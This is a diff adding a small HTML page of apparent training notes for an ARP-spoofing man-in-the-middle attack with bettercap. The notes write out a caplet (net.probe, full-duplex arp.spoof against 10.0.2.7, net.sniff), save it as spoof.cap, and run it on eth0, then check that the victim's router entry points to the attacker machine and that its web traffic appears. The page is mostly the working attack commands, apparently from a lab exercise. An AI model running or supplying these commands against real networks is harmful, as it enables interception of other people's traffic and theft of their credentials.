@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        body {
+            height: 100%;
+            width: 100%;
+            background: #f5f6fa;
+        }
+
+        div {
+            color: #67727e;
+            font-size: 20px;
+            padding-left: 20px;
+        }
+    </style>
+</head>
+
+<body>
+    <div>
+
+        11..42<br><br>
+
+        Custom Spoofing Script<br>
+        First write all the commands that we did for spoofing attack in a file<br><br>
+
+        net.probe on<br>
+        set arp.spoof.fullduplex true<br>
+        set arp.spoof.targets 10.0.2.7<br>
+        arp.spoof on<br>
+        net.sniff on<br><br>
+
+        Save this in a text file open a text file<br>
+        spoof.cap in a root dir<br><br>
+
+
+        Now in terminal write this<br><br>
+        bettercap —help<br>
+        bettercap -iface eth0 -caplet spoof.cap<br><br>
+
+        Once you write this command it will show output with error or not<br><br>
+        You can just type help to know if all the modules are running<br><br>
+
+        In the target network if it contains the router IP address as kali ether address<br><br>
+
+        And when we try to access website<br>
+        It shows in the bettercap tools then it working<br>
+
+
+    </div>
+</body>
+
+</html>
